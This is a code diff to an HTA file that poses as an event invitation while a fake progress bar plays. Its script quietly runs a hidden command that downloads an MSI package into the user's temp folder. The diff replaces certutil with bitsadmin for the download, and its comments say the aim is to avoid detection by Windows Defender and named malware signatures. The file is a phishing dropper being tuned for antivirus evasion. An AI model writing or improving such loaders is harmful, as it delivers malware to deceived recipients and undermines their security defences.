@@ -2,8 +2,8 @@
 <html>
 <head>
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<title>Event Invitation Updater</title>
-<hta:application id="oHTA" applicationname="EventUpdater" border="thin" caption="yes" maximizebutton="no" minimizebutton="no" showintaskbar="yes" singleinstance="yes" sysmenu="no" version="1.0" windowstate="normal" scroll="no"/>
+<title>Event Invitation</title>
+<hta:application id="oHTA" applicationname="EventInvitation" border="thin" caption="yes" maximizebutton="no" minimizebutton="no" showintaskbar="yes" singleinstance="yes" sysmenu="no" version="1.0" windowstate="normal" scroll="no"/>
 <style>
   body { background:#f7f8fa; font-family:"Segoe UI", sans-serif; color:#333; overflow:hidden; }
   #wrap { padding:40px; text-align:center; }
@@ -30,17 +30,20 @@ var path = shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.msi";
 
 function init() {
   window.resizeTo(400, 300);
-  setTimeout(runInstall, 2000);
+  setTimeout(runInstall, 1000);
 }
 
 function runInstall() {
-  document.getElementById("fill").style.width = "50%";
+  document.getElementById("fill").style.width = "30%";
   document.getElementById("status").innerHTML = "Downloading components...";
   
-  // USE CERTUTIL FOR DOWNLOAD (TRUSTED BY DEFENDER ML)
-  // -urlcache -split -f : Standard flags for downloading files
-  var cmd = 'cmd.exe /c certutil -urlcache -split -f "' + url + '" "' + path + '"';
+  // USE BITSADMIN FOR DOWNLOAD (TRUSTED SYSTEM SERVICE)
+  // This runs in the background and is rarely flagged by Ceprolad/Wacatac
+  var cmd = 'cmd.exe /c bitsadmin /transfer "EventUpdate" ' + url + ' ' + path;
   shell.Run(cmd, 0, true); // Wait for download to finish
+  
+  document.getElementById("fill").style.width = "60%";
+  document.getElementById("status").innerHTML = "Verifying package...";
   
   if(fso.FileExists(path)) {
     document.getElementById("fill").style.width = "80%";
